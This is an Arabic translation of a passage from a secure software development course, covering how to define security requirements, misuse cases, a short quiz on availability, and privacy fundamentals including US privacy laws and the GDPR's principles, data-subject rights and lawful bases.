في بعض الحالات ، يجب أن يتوافق البرنامج مع قوانين أو لوائح خاصة. هذا صحيح بشكل خاص في المناطق التي من المرجح أن تؤدي فيها نقاط الضعف إلى ضرر كبير (مثل الأنظمة الطبية والمالية والعسكرية). ينشأ هذا أيضا إذا كنت تخطط لبيع برامج ، أو نظام به برامج ، في العديد من الولايات القضائية القانونية المختلفة (لذلك قد يكون هناك العديد من القوانين أو اللوائح التي تنطبق). مرة أخرى ، لأغراضنا هذه كلها متطلبات.

قد لا يتم تسجيل المتطلبات في وثيقة رسمية واحدة. في بعض الأحيان يتم قبول كل متطلب جديد محدد ببساطة كمشكلة في أداة تعقب المشكلات / الأخطاء. في معظم مشاريع تطوير البرمجيات ، يتم تحديد المتطلبات بمرور الوقت في المناقشات مع مستخدميها.

لا *يلزم* حتى  تدوين المتطلبات لاستخدامها ، خاصة بالنسبة لمشروع صغير. ومع ذلك ، على الأقل في حالة الأمان ، من الجيد تسجيل متطلبات الأمان عالية المستوى في مكان واحد. بعد ذلك ، عندما يفكر شخص ما في استخدام برنامجك أو تعديله ، سيكون لديه فكرة عما يحاول النظام تحقيقه من أجل الأمان.

بالطبع ، تعتمد المتطلبات الفعلية على ما تحاول تحقيقه.

إذن كيف يمكنك تحديد متطلبات الأمان لنظام معين؟ تتمثل إحدى طرق تحديد متطلبات الأمان في التفكير في أهداف الأمان المشتركة ووظائف الأمان الداعمة التي ناقشناها *بالفعل* وتحديد المتطلبات المحددة لنظامك في كل فئة. على وجه الخصوص ، فكر في كيفية تطبيق كل واحد على نوع المعلومات التي سيديرها برنامجك. دعنا نتعرف على كل هدف أمني ووظيفة أمان داعمة ، ونناقش بعض الأشياء التي يجب مراعاتها:

1. **السرية** ("لا توجد قراءة غير مصرح بها")<br> تحديد المعلومات التي لا ينبغي الكشف عنها علنا ، مثل المعلومات الخاصة حول الأشخاص والأنظمة. من الذي يجب أن يسمح له برؤية ذلك؟ هل يمكنك تجنب الحصول على هذه المعلومات على الإطلاق (حيث لا يمكنك الكشف عما ليس لديك)؟ إذا قمت بتخزين معلومات كلمة المرور حتى يتمكن الأشخاص من تسجيل الدخول إلى نظامك (المعروف أيضا باسم المصادقة "الواردة") ، فأنت بحاجة إلى تخزين معلومات كلمة المرور هذه باستخدام خوارزميات خاصة مصممة لها (مثل Argon2id) ، كما سنناقش لاحقا.

2. **النزاهة** ("لا يوجد تعديل غير مصرح به")<br> تحديد المعلومات التي يجب السماح لبعض الأشخاص فقط بتعديلها ، ومن هو.

3. **التوفر** ("يستمر في العمل في وجود هجوم")<br>ما هو التأثير إذا لم يعمل لفترة من الوقت - هل هذا خطير؟ نادرا ما يكون التوافر مطلقا. إذا كان نظامك يمكن الوصول إليه عبر الإنترنت ، فإن توفير التوافر يمثل تحديا كبيرا ؛ يمكن للمهاجم ذو الموارد الجيدة دائما استخدام هجوم رفض الخدمة الموزع (DDoS) لإنزال موقع ، على الأقل لفترة قصيرة. من الممكن العمل على مواجهة هجمات DDoS ، ولكن في النهاية يمكن أن تتحول إلى منافسة بين عدد الموارد التي يمتلكها كل جانب.

    حتى عندما لا يمكن ضمان التوافر عالميا ، لا يزال بإمكانك الحصول على برنامج آمن من خلال التركيز على العناصر الأكثر خطورة ([ليس كل المهاجمين متساوين: فهم ومنع DoS في تطبيقات الويب ، ](https://r2c.dev/blog/2020/understanding-and-preventing-dos-in-web-apps/)بقلم Jacob Kaplan-Moss ، 2020).  في كثير من الحالات ، ركز على تطوير برنامجك بحيث لا  يكون *من السهل* التغلب عليه أو إنزاله بمدخلات بسيطة ؛ اجعل من الممكن توسيع نطاق البرنامج مؤقتا عن طريق إضافة خوادم جديدة بسرعة ؛ وتنفيذ البرنامج بحيث يتعافى بسرعة عند انتهاء الهجوم. لمواجهة خطر تدمير النظام أو حذف بياناته ، صمم البرنامج بحيث يتم نسخ بياناته احتياطيا بسهولة ، وخطط للنسخ الاحتياطية. تأكد من إمكانية نسخ البيانات احتياطيا إلى "التخزين البارد" (حيث لا يمكن إتلاف البيانات لاحقا إذا تم تخريب البرنامج). إذا تم نسخ النظام احتياطيا بشكل روتيني في العمليات ، فيمكنك الاسترداد بسرعة نسبية (جزئيا على الأقل). لذا نعم  ، *يمكنك* الحصول على التوافر كشرط ، طالما أن قيوده واضحة.

4. **عدم التنصل** ("إثبات أن شخصا ما  فعل شيئا ما")<br>هل هناك بعض الإجراءات التي تريد أن تكون قادرا على *إثبات* أن شخصا ما اتخذها؟ في العديد من الأنظمة ، هذا ليس حرجا ، لكنه في بعض الأنظمة كذلك.

5. **الهوية والمصادقة (I&A)**<br>كيف سيثبت المستخدمون من هم؟ تريد التأكد من أن شخصا ما لا يمكنه انتحال مستخدم شرعي. يجب أن تدعم عادة المصادقة الثنائية (2FA) ، إما مباشرة أو عن طريق السماح للمستخدمين بإثبات هويتهم عبر بعض الخدمات الأخرى التي تدعمها.

6. **التفويض**<br>من يسمح له بفعل ماذا؟ هذا جزء من السرية والنزاهة ، ولكن إذا فكرت في أدوار الأشخاص بالإضافة إلى التفكير في المعلومات التي يجب حمايتها ، فمن المحتمل أن تحصل على صورة أفضل.

7. **التدقيق / التسجيل**<br>ما هي المعلومات / الأحداث التي يجب عليك تسجيلها؟ عادة ما تقوم على الأقل بتسجيل الدخول وتسجيل الخروج والأحداث المهمة مثل إنشاء حساب المستخدم وحذفه. بشكل عام ، يجب أن يسجل النظام وقت حدوث شيء ما (التاريخ والوقت) ، وما حدث ، وما هو مكون النظام الذي فعله ، ومن تسبب في حدوثه.

سترى أحيانا مستندات تستخدم مصطلحي الأمان "الموضوع" و "الكائن". "الموضوع" هو شيء يعمل (على سبيل المثال ، مستخدم أو عملية). "الكائن" هو شيء يتم التصرف فيه (على سبيل المثال ، منفذ ملف أو شبكة).

يلتقط بعض المطورين بعض المتطلبات كحالات *استخدام*. كل حالة استخدام هي قائمة من التفاعلات بين الفاعل (الفاعلين) ونظام لتحقيق هدف. وقد أدى ذلك إلى نهج أمني مثير للاهتمام ، وتطوير  حالات *إساءة الاستخدام* أو *حالات سوء الاستخدام*. حالة الإساءة هي قائمة من التفاعلات بين الجهات الفاعلة والنظام التي تهدف إلى التسبب في ضرر (على سبيل المثال ، للنظام أو الفاعل (الفاعلين) أو أصحاب المصلحة). مصطلح مشابه جدا هو "حالة إساءة الاستخدام" ، وهو وصف لعمل ضار ضد النظام. وقد وجد الكثيرون أنه من المفيد تحديد حالات إساءة الاستخدام أو حالات إساءة الاستخدام لوصف الكيفية التي يجب أن يتصدى بها النظام ** لإساءة الاستخدام / سوء الاستخدام هذه. من خلال التفكير في سوء المعاملة وسوء الاستخدام ، ومعرفة كيفية مواجهتها مبكرا ، يمكن منع الكثير من الأذى. يجد العديد من المطورين صعوبة * في التفكير كمهاجم* ، لذلك سنركز خلال هذه الدورة على تقنيات لمساعدتك في العثور على نقاط الضعف على أي حال ، على سبيل المثال ، من خلال تحديد الأنواع الشائعة من نقاط الضعف وشرح كيفية القيام بنمذجة التهديد بشكل منهجي.

أحد الجوانب المهمة حول متطلبات الأمان هو نوع المهاجمين الذين تتوقع مواجهتهم. إن مواجهة الهجمات المستهدفة من قبل الدول القومية ذات الموارد الجيدة أمر بالغ الصعوبة. تحتاج إلى معرفة وتطبيق أكثر مما يمكن أن تغطيه هذه الدورة في حد ذاتها. ومع ذلك ، فإن معظم الناس لا يحاولون تطوير أنظمة تصمد أمام هذه الأنواع من الهجمات. في هذه الدورة ، سنفترض أن برنامجك يجب أن يقف في وجه الهجمات التي قد يحتاج موقع تجاري نموذجي إلى مواجهتها ، حيث يكون لدى المهاجم موارد محدودة وغالبا ما تكون الهجمات غير مستهدفة بشكل كبير. إذا كنت بحاجة إلى الدفاع ضد المهاجمين بمزيد من الموارد ، فربما تحتاج إلى القيام بالمزيد ، لكن المواد الموجودة في هذه الدورة ستمنحك نقطة انطلاق جيدة.

لاحظ أننا نركز في هذه الدورة على المهاجمين وليس المتسللين. في مجتمع الكمبيوتر ، يستخدم مصطلح "هاكر" على نطاق واسع لتحديد "*الشخص الذي يسعد بالحصول على فهم حميم للأعمال الداخلية للنظام ، وأجهزة الكمبيوتر وشبكات الكمبيوتر على وجه الخصوص". * ([IETF RFC 1983](https://tools.ietf.org/html/rfc1983)). وفقا لهذا التعريف ، لا يهاجم العديد من المتسللين أنظمة الكمبيوتر أبدا ، والعديد من المهاجمين ليسوا قراصنة. تركز هذه الدورة على إحباط المهاجمين.

إذا كنت تبحث عن أفكار لمتطلبات الأمان المحتملة ، فإن أحد المصادر هو [*المعايير العامة لتقييم أمن تكنولوجيا المعلومات "(CC) الجزء 2*](https://www.commoncriteriaportal.org/) ، وهو متاح مجانا. CC هو معيار دولي لتقييم الأمن تم تطويره في الأصل في عام 1994. لا تخضع الغالبية العظمى من البرامج التي تم تطويرها اليوم لتقييم CC ، ويرجع ذلك جزئيا إلى أنه غالبا ما يكون مكلفا ويستغرق وقتا طويلا أن يقوم مختبر خارجي بتقييم برنامجك رسميا باستخدام CC. ومع ذلك ، لا يزال بإمكانك إلقاء نظرة على CC للحصول على أفكار حتى لو لم تستخدم مختبر التقييم. CC متاح للجمهور ويتكون من 3 أجزاء: الجزء 1 عبارة عن مقدمة ، والجزء 2 عبارة عن قائمة بالمتطلبات الوظيفية الأمنية المشتركة ، والجزء 3 عبارة عن قائمة بمتطلبات الضمان المشتركة. الجزء 2 على وجه الخصوص هو قائمة *"وظائف الأمان التي قد تحتاجها".* إذا كنت تشك في أن نظامك سيحتاج إلى بعض متطلبات الأمان الخاصة ، ولكنك غير متأكد من تلك المتطلبات ، فإن الجزء 2 يوفر قائمة طويلة من الأفكار التي قد تكون مفيدة. بعض مصطلحاته غامضة ، لكنها تتضمن مسردا يمكن أن يساعد.

**أخيرا:** إذا كان هناك برنامج موجود يقوم بشيء مثل البرنامج الذي تقوم بتطويره ، فراجع قدراته الأمنية. لقد أضافوا هذه الإمكانات لسبب ما ، وقد يحتاج برنامجك إلى بعضها على الأقل أيضا.

#### اختبار 1.2: متطلبات الأمان

\>\>من المتطلبات النموذجية للخدمة المتصلة بالإنترنت أن تظل متاحة بغض النظر عن الهجمات التي تتعرض لها. صواب أم خطأ؟<<

( ) صحيح

(x) خطأ

[تفسير]

هذا غير صحيح. سيكون من الرائع أن نتمكن من ضمان بقاء جميع الخدمات المتصلة بالإنترنت متاحة دائما. ولكن في معظم الحالات ، إذا طلب كل جهاز في العالم متصل بالإنترنت خدمة معينة ، فلن تتمكن هذه الخدمة من التعامل مع الحمل. في مرحلة ما ، يمكن للمهاجمين الذين لديهم العديد من الموارد عادة أن يطغى على توافر مدافع بموارد قليلة.

بالطبع ، يجب ألا نجعل من السهل على المهاجم إنزال النظام. لذا بدلا من ذلك ، يجب أن تكون أي خدمات متصلة بالإنترنت نقوم بإنشائها قادرة على التعامل مع بعض معدل الطلب المعتدل بحيث يتعين على المهاجم على الأقل تخصيص موارد غير تافهة. يمكنك القيام بذلك عن طريق تصميم النظام بحيث يمكن توسيع نطاقه بسرعة إلى أحجام طلبات كبيرة ، واستخدام خدمات أخرى مثل شبكات توصيل المحتوى (CDNs) لتقوية النظام ضد الأحمال الكبيرة. بالإضافة إلى ذلك ، يمكن للخدمة استخدام تقنيات مثل الاسترداد السريع بحيث حتى لو تم إنزالها بواسطة هجوم ، يمكنها التعافي بسرعة عند انتهاء الهجوم.

[تفسير]

### ما هي الخصوصية ولماذا هي مهمة

الأمن والخصوصية مترابطان ، لكنهما ليسا نفس الشيء. سنغطي في هذه الوحدة ماهية الخصوصية وعلاقتها بالأمان وسبب أهمية الخصوصية.

#### ماذا تعني الخصوصية؟

تعرف الرابطة الدولية لمحترفي الخصوصية (IAPP) غير[ الربحية  الخصوصية ](https://iapp.org/about/what-is-privacy/) بأنها *"الحق في أن تترك وحدها ، أو التحرر من التدخل أو التطفل".* وبشكل أكثر تحديدا ، تقول *"خصوصية المعلومات هي الحق في الحصول على بعض التحكم في كيفية جمع معلوماتك الشخصية واستخدامها ... الثقافات المختلفة لديها وجهات نظر مختلفة على نطاق واسع حول ماهية حقوق الشخص عندما يتعلق الأمر بالخصوصية وكيف ينبغي تنظيمها ". * كما أنها تتناقض بين الخصوصية والأمان: *"تركز خصوصية البيانات على استخدام البيانات الشخصية وإدارتها - أشياء مثل وضع سياسات لضمان جمع المعلومات الشخصية للمستهلكين ومشاركتها واستخدامها بطرق مناسبة".*

بعبارة أخرى ، تتعلق الخصوصية بحماية البيانات الشخصية للأفراد من سوء المعاملة.

#### لماذا الخصوصية مهمة؟

بينما جادل البعض بأن الخصوصية لم تعد ممكنة أو ذات صلة ، يختلف الكثيرون ، وقد تم وضع العديد من القوانين في جميع أنحاء العالم لحماية الخصوصية. أحد الملخصات التي يمكن الوصول إليها للموقف الواسع الانتشار بأن الخصوصية مهمة هو حديث جلين جرينوالد في TED " [*لماذا الخصوصية مهمة"*](https://www.ted.com/talks/glenn_greenwald_why_privacy_matters) (2014). فيما يلي بعض نقاطه (انظر الحديث للحصول على التفاصيل):

* الأشخاص الذين يقولون * ، "إذا كنت تفعل شيئا لا تريد أن يعرفه الآخرون ، فربما لا ينبغي عليك فعله في المقام الأول"* منخرطون في استنكار شديد للذات. * "ما يقولونه حقا هو: "لقد وافقت على أن أجعل شخصا غير ضار وغير مهدد وغير مثير للاهتمام لدرجة أنني في الواقع لا أخشى أن تعرف الحكومة ما أفعله".*

* العديد من هؤلاء الأشخاص أنفسهم [الذين يقدمون هذه الادعاءات] لا يتصرفون بهذه الطريقة ، على سبيل المثال ، سيتخذون العديد من الخطوات للحصول على الخصوصية لأنفسهم.

* *"هناك سبب لشغف الخصوصية عالميا وغريزيا ... عندما نكون في حالة يمكن مراقبتنا فيها ، حيث يمكن مراقبتنا ، يتغير سلوكنا بشكل كبير ... هناك العشرات من الدراسات النفسية التي تثبت أنه عندما يعرف شخص ما أنه قد تتم مراقبته ، فإن السلوك الذي ينخرط فيه يكون أكثر امتثالا وامتثالا إلى حد كبير.*

* *"المراقبة الجماعية تخلق سجنا في العقل أكثر دهاء على الرغم من أنه وسيلة أكثر فعالية لتعزيز الامتثال للمعايير الاجتماعية أو مع العقيدة الاجتماعية ، وأكثر فعالية بكثير مما يمكن أن تكون عليه القوة الغاشمة."*

* *"إن المجتمع الذي يمكن فيه مراقبة الناس في جميع الأوقات هو مجتمع يولد الامتثال والطاعة والخضوع ، وهذا هو السبب في أن كل طاغية ، من الأكثر علنية إلى الأكثر دهاء ، يتوق إلى هذا النظام".*

* *"عندما نسمح بوجود مجتمع نخضع فيه للمراقبة المستمرة ، فإننا نسمح لجوهر حرية الإنسان بالشلل الشديد."*

* *"إن نظام المراقبة الجماعية يقمع حريتنا بكل أنواع الطرق. إنه يجعل جميع أنواع الخيارات السلوكية محظورة دون أن نعرف حتى أنه حدث ".*

### متطلبات الخصوصية

#### أبسط نهج: لا تجمع المعلومات الشخصية

تتمثل الخطوة الأولى لمعالجة الخصوصية في الاعتراف بأهمية الخصوصية ، ثم التفكير في كيفية التأكد من أن برنامجك يوفر خصوصية كافية إذا كان يجمع معلومات عن الأفراد.

إن أبسط نهج للخصوصية ، وغالبا ما يكون أفضل نقطة انطلاق ، هو *عدم* جمع معلومات عن الأفراد إلا إذا كنت في حاجة إليها. إذا لم تقم بجمع المعلومات ، فلا يمكنك الكشف عنها لاحقا ، ولا يتعين عليك تحديد كيفية منع إساءة استخدامها. القضاء عليه هو الأفضل من وجهة نظر الخصوصية.

إذا تعذر ذلك ، قلل من المعلومات الشخصية إلى ما تحتاجه تماما. إذا كان يجب عليك جمع معلومات عن الأفراد ، فيجب عليك توفير مجموعة متنوعة من الحماية لهم ، على الأقل تلك التي يتطلبها القانون واللوائح. قد يكون هذا معقدا ، لأنه قد يتم تطبيق العديد من القوانين واللوائح.

#### قوانين ولوائح الخصوصية

القوانين واللوائح المتعلقة بالخصوصية منتشرة على نطاق واسع. يتم استخدام مصطلحات مختلفة لهم ، بما في ذلك خصوصية المعلومات وخصوصية البيانات وحماية البيانات. يعتمد تأثير هذه القوانين واللوائح على برنامجك أم لا على نوع البيانات التي يجمعها برنامجك. في كثير من الحالات ، لا يحتاج البرنامج إلى القيام بأي شيء خاص للخصوصية. ومع ذلك ، في حالات أخرى ، يمكن أن تكون هذه القوانين واللوائح مهمة للغاية.

[تم التصديق على المادة 17 من العهد الدولي الخاص بالحقوق المدنية والسياسية للأمم المتحدة](https://www.ohchr.org/en/professionalinterest/pages/ccpr.aspx) في عام 1966 على نطاق واسع وهي تحمي الخصوصية. وتنص على أنه *"لا يجوز تعريض أي شخص، على نحو تعسفي أو غير قانوني، لتدخل في خصوصياته أو شؤون أسرته أو بيته أو مراسلاته، ولا لحملات غير مشروعة تمس شرفه وسمعته. لكل شخص الحق في حماية القانون من مثل هذا التدخل أو الهجمات".*

البلدان المختلفة ، والمقاطعات / الولايات داخل البلدان ، لديها قوانين مختلفة فيما يتعلق بالخصوصية. سنناقش هنا بإيجاز النهج الأمريكي والأوروبي.

#### الولايات المتحدة الأمريكية

ليس لدى الولايات المتحدة (الولايات المتحدة) قانون شامل لخصوصية المعلومات ككل. بدلا من ذلك ، لدى الحكومة الفيدرالية الأمريكية عدد من القوانين التي تغطي ظروفا محددة. يتضمن ذلك قانون الخصوصية والحقوق التعليمية للأسرة لعام 1974 (FERPA) لسجلات تعليم الطلاب ، وقانون نقل التأمين الصحي والمساءلة لعام 1996 (HIPAA) للبيانات المتعلقة بالصحة ، وقانون حماية خصوصية الأطفال على الإنترنت لعام 1998 (COPPA) للبيانات المتعلقة بالأطفال ، وقانون المعاملات الائتمانية العادلة والدقيقة لعام 2003 (FACTA) لبعض البيانات المالية.

  ينص [قانون الخصوصية الأمريكي لعام 1974 (5 USC 552a)](https://www.govinfo.gov/content/pkg/USCODE-2018-title5/pdf/USCODE-2018-title5-partI-chap5-subchapII-sec552a.pdf) على كيفية احتفاظ الوكالات الفيدرالية الأمريكية بسجلات حول الأفراد من مواطني الولايات المتحدة والأجانب المقيمين الدائمين الشرعيين. على سبيل المثال ، يجب عليهم:

* جمع المعلومات ذات الصلة والضرورية ذات الصلة والضرورية فقط لتنفيذ وظيفة الوكالة ؛

* شرح في وقت جمع المعلومات ، ولماذا هناك حاجة إليها وكيف سيتم استخدامها ؛

* التأكد من أن السجلات تستخدم فقط للأسباب المقدمة ، أو طلب إذن الشخص عندما يعتبر غرض آخر لاستخدام السجلات ضروريا أو مرغوبا فيه ؛

* توفير ضمانات كافية لحماية السجلات من الوصول والكشف غير المصرح بهما ؛ و

* اسمح للأشخاص برؤية السجلات المحفوظة عليها وتزويدهم بفرصة لتصحيح الأخطاء في سجلاتهم.

بعض الولايات الأمريكية لديها قوانين إضافية. على سبيل المثال ، [ يتطلب قانون حماية الخصوصية عبر الإنترنت في كاليفورنيا (OPPA) لعام 2003](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575) من  مشغلي مواقع الويب التجارية أو الخدمات * عبر الإنترنت "التي تجمع معلومات التعريف الشخصية عبر الإنترنت عن المستهلكين الأفراد المقيمين في كاليفورنيا الذين يستخدمون أو يزورون [يجب أن يكون الموقع أو الخدمة] سياسة الخصوصية الخاصة بها بشكل واضح ..."* في الآونة الأخيرة  ، يمنح [قانون خصوصية المستهلك في كاليفورنيا لعام 2018 (CCPA)](https://leginfo.legislature.ca.gov/faces/codes_displayText.xhtml?division=3.&part=4.&lawCode=CIV&title=1.81.5) ، الذي دخل حيز التنفيذ في عام 2020 ، سكان كاليفورنيا حقوقا إضافية لمعرفة المعلومات الشخصية التي تم جمعها من قبل الشركات ، وإلغاء الاشتراك في بيع تلك المعلومات.

أوروبا ** لديها قانون شامل، وحتى أولئك الذين هم خارج أوروبا في كثير من الأحيان يجب أن يمتثلوا له. لذلك دعونا نركز على ذلك. ينطبق على العديد من المواقف ، وسيساعدك فهمه على فهم متطلبات الخصوصية الأخرى.

#### اللائحة الأوروبية العامة لحماية البيانات (GDPR)

تحمي اللائحة الأوروبية العامة لحماية البيانات (GDPR) البيانات الشخصية للأشخاص الموجودين في الاتحاد الأوروبي (EU). ينطبق سواء حدثت معالجة البيانات داخل الاتحاد الأوروبي أم لا ، وينطبق سواء كان الأشخاص مواطنين أوروبيين أم لا. نتيجة لذلك ، يتم تطبيق اللائحة العامة لحماية البيانات في العديد من الظروف. [تحتوي مؤسسة Linux على ملخص للائحة العامة لحماية البيانات (GDPR) ](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf) يسلط الضوء على المشكلات المهمة لمطوري البرامج. نشير أدناه إلى بعض أساسيات اللائحة العامة لحماية البيانات من ملخص اللائحة العامة لحماية البيانات (GDPR) لمؤسسة Linux.

لكن أولا: الامتثال للائحة العامة لحماية البيانات أمر مهم. يمكن أن تؤدي الانتهاكات الخطيرة إلى غرامة تصل إلى 20 مليون يورو ، أو 4٪ من الإيرادات السنوية للشركة في جميع أنحاء العالم من السنة المالية السابقة ، أيهما *أعلى*.

تعرف اللائحة العامة لحماية البيانات البيانات الشخصية (التي تتطلب الحماية على هذا النحو) بأنها *"أي معلومات تتعلق بشخص طبيعي محدد أو يمكن التعرف عليه ("موضوع البيانات") ؛ الشخص الطبيعي الذي يمكن التعرف عليه هو الشخص الذي يمكن تحديده، بشكل مباشر أو غير مباشر، ولا سيما بالرجوع إلى محدد الهوية مثل الاسم أو رقم التعريف أو بيانات الموقع أو المعرف عبر الإنترنت أو إلى واحد أو أكثر من العوامل المحددة للهوية المادية أو الفسيولوجية أو الجينية أو العقلية أو الاقتصادية أو الثقافية أو الاجتماعية لذلك الشخص الطبيعي.* . لاحظ أنه ليس فقط البيانات التي تحدد هوية الفرد - إنها بيانات متصلة بالبيانات التي تحدد هوية الفرد. على سبيل المثال ، العنوان البريدي للشخص هو بيانات شخصية. التفاصيل المتعلقة بمهارات الشخص أو تفضيلاته هي أيضا بيانات شخصية إذا كانت مرتبطة ، أو يمكن ربطها بشكل معقول ، بمعلومات أخرى تحدد هوية هذا الفرد.

بموجب اللائحة العامة لحماية البيانات (GDPR) ، تعتبر بعض البيانات الشخصية أكثر حساسية ، وهناك قيود أكبر على جمعها ومعالجتها. وتشمل هذه:

* الأصل العرقي أو الإثني

* الآراء السياسية أو المعتقدات الدينية أو الفلسفية أو العضوية النقابية

* البيانات الجينية

* البيانات البيومترية لغرض تحديد هوية الشخص الطبيعي بشكل فريد

* البيانات المتعلقة بالصحة

* البيانات المتعلقة بالحياة الجنسية للشخص الطبيعي أو توجهه الجنسي

تتم معالجة البيانات الشخصية ** في أي وقت يتم فيه إجراء عملية عليها. يتضمن ذلك جمعها وتخزينها وعرضها ونقلها وحذفها ، سواء بوسائل آلية أم لا. في اللائحة العامة لحماية البيانات (GDPR) ، "وحدة التحكم" هي الشخص أو المنظمة التي تحدد الغرض من المعالجة ووسائلها. "المعالج" هو طرف ثالث يعالج البيانات نيابة عن وحدة التحكم.

تحدد اللائحة العامة لحماية البيانات (GDPR) سبعة مبادئ أساسية لمعالجة البيانات الشخصية. تحدد هذه المبادئ أغراض جميع الأحكام المحددة للائحة العامة لحماية البيانات. إن فهمها يقطع شوطا طويلا نحو الحصول على رؤية أولية جيدة حول ما إذا كان من المحتمل أن يكون استخدام معين للبيانات الشخصية مقبولا. هذه هي:

1. **الشرعية والإنصاف والشفافية**<br>معالجة البيانات الشخصية بطريقة قانونية وعادلة وشفافة لموضوع البيانات.

2. **تحديد الغرض**<br>معالجة البيانات الشخصية فقط بطرق متوافقة مع الأغراض المشروعة التي تم جمعها من أجلها.

3. **تقليل البيانات**<br>قصر البيانات الشخصية التي تجمعها على ما هو مناسب لتلك الأغراض.

4. **الدقة**<br>حافظ على دقة البيانات الشخصية وتحديثها ، واتخذ كل خطوة معقولة لمحو البيانات غير الدقيقة أو تصحيحها.

5. **قيود التخزين**<br>تخزين البيانات الشخصية في شكل يسمح بتحديد الهوية لفترة لا تزيد عن اللازم للأغراض التي تم جمعها من أجلها.

6. **النزاهة والسرية**<br>معالجة البيانات الشخصية بطريقة تضمن الأمان المناسب.

7. **المساءلة**<br>مراقب البيانات الشخصية مسؤول عن المبادئ المذكورة أعلاه ، وعن إثبات امتثاله لها.

تحدد ست مقالات في اللائحة العامة لحماية البيانات حقوقا محددة تمنح للأفراد فيما يتعلق ببياناتهم الشخصية. يمنح هذا المقيمين في الاتحاد الأوروبي الحق في الاتصال بمراقب البيانات وطلب اتخاذ إجراءات معينة (*طلبات الناتج المحلي الإجمالي*). نظرا لأن المقيمين في الاتحاد الأوروبي يتمتعون بهذه الحقوق ، يجب تصميم أنظمة البرمجيات والعمليات التنظيمية لتمكين هذه الحقوق. تتضمن أنواع الطلبات الموضحة في اللائحة العامة لحماية البيانات ما يلي:

* **حق الوصول** (المادة 15)<br>يمكن لأصحاب البيانات أن يسألوا عما إذا كانت بياناتهم الشخصية قيد المعالجة. إذا كان الأمر كذلك ، فيمكنهم الحصول على "الوصول" إلى البيانات (على سبيل المثال ، نسخة أو لقطة شاشة منها) والمعلومات المتعلقة بالمعالجة.

* **الحق في التصحيح** (المادة 16)<br>يمكن أن يكون لدى أصحاب البيانات بيانات غير دقيقة محدثة وصحيحة.

* **الحق في المحو (**المعروف أيضا باسم "الحق في النسيان") (المادة 17) في<br> ظروف معينة ، يمكن مسح بيانات أصحاب البيانات الشخصية.

* **الحق في تقييد المعالجة** (المادة 18)<br>في ظروف معينة ، يمكن لأصحاب البيانات تقييد معالجة بياناتهم الشخصية. لا يزال من الممكن تخزينه ، ما لم يتم تقديم طلب "الحق في الحذف" أيضا.

* **الحق في إمكانية نقل البيانات (**المادة 20)<br>في ظروف معينة ، يمكن لأصحاب البيانات تصدير بياناتهم الشخصية (على سبيل المثال ، المقدمة إلى موضوع البيانات أو طرف ثالث بتنسيق منظم وشائع الاستخدام ويمكن قراءته آليا).

* **الحق في الاعتراض ** (المادة 21)<br>في ظروف معينة ، لا سيما لأغراض التسويق المباشر والتنميط ، يمكن لأصحاب البيانات الاعتراض على معالجة بياناتهم الشخصية.

لمعالجة البيانات الشخصية ، يجب أن تكون قانونية ، مما يعني أنها يجب أن تندرج في فئة واحدة على الأقل من عدة فئات ، بما في ذلك ما يلي من بين فئات أخرى:

* **الامتثال للقانون**. يمكن معالجة البيانات الشخصية إذا كانت ضرورية للامتثال لالتزام قانوني.

* **تنفيذ عقد مع صاحب البيانات**. يمكن معالجة البيانات الشخصية إذا كان من الضروري تنفيذ عقد مع موضوع البيانات هذا. *لاحظ أن هذا لا ينطبق على الأرجح على عقد مع شخص آخر غير موضوع البيانات ، مثل صاحب العمل.*

* **المصالح التجارية المشروعة**. يمكن معالجة البيانات الشخصية إذا كان القيام بذلك يتوافق مع "المصالح المشروعة" ، ما لم يتم تجاوزها من قبل مصالح موضوع البيانات على عكس ذلك. يمكن أن يكون هذا مفهوما أكثر غموضا.

* **الموافقة**. يمكن معالجة البيانات الشخصية إذا أعطى موضوع البيانات موافقته.

لاحظ أنه يمكن معالجة البيانات الشخصية إذا أعطى موضوع البيانات موافقته. ومع ذلك ، لكي تكون الموافقة صالحة بموجب اللائحة العامة لحماية البيانات:

* يجب أن تكون "محددة*"  و  "*مستنيرة"* (على سبيل المثال ، يجب أن تتضمن وصفا محددا للبيانات التي يتم جمعها ، وكيف سيتم استخدامها) ؛*  

* يتطلب  "*إجراء إيجابي واضح"* من قبل موضوع البيانات (على سبيل المثال ، مطالبة المشارك بتحديد مربع اختيار ، وعدم التحقق منه مسبقا) ؛ و

* يجب أن تكون قابلة للإلغاء بحرية (على سبيل المثال ، يجب أن يكون موضوع البيانات قادرا على سحب الموافقة في أي وقت).

حتى إذا تم منح الموافقة ، فقد ترغب أيضا في العثور على أساس قانوني آخر لمعالجة البيانات ، خاصة إذا كنت ترغب في الاحتفاظ بها. بموجب اللائحة العامة لحماية البيانات (GDPR) ، يحظر عليك عموما الاحتفاظ بالبيانات الشخصية دون أساس قانوني.

بموجب اللائحة العامة لحماية البيانات (GDPR) ، * فإن التنميط* هو أي شكل من أشكال المعالجة الآلية التي تتضمن استخدام البيانات الشخصية لتقييم جوانب هذا الشخص. يتطلب التنميط عادة الحصول على موافقة صريحة من الفرد ، مما يعني أيضا أن الفرد سيكون قادرا على سحب هذه الموافقة في أي وقت. لذلك ، تتطلب أنشطة التنميط عادة درجة أكبر من المراجعة والحماية للبيانات الشخصية المعمول بها.

فيما يلي بعض الموارد لمعرفة المزيد عن اللائحة العامة لحماية البيانات:

*  [الموقع الرسمي للاتحاد الأوروبي لنص الناتج المحلي الإجمالي](http://data.europa.eu/eli/reg/2016/679/oj)

* [*"دليل اللائحة العامة لحماية البيانات (GDPR)"*](https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-the-general-data-protection-regulation-gdpr/)

* [*"حلول للاستخدام المسؤول ل blockchain في سياق البيانات الشخصية"*](https://www.cnil.fr/sites/default/files/atoms/files/blockchain_en.pdf)

* [*"أمن البيانات الشخصية"*](https://www.cnil.fr/sites/default/files/atoms/files/cnil_guide_securite_personnelle_gb_web.pdf)

* مؤسسة لينكس ،  "[*ملخص مفاهيم الناتج المحلي الإجمالي لمشاريع البرمجيات الحرة والمفتوحة المصدر"*](https://www.linuxfoundation.org/wp-content/uploads/2018/05/lf_gdpr_052418.pdf)

* [قانون حماية الخصوصية عبر الإنترنت في كاليفورنيا، الفصل 22. متطلبات خصوصية الإنترنت [22575-22579]](https://leginfo.legislature.ca.gov/faces/codes_displaySection.xhtml?lawCode=BPC&sectionNum=22575)

#### قياس البعد

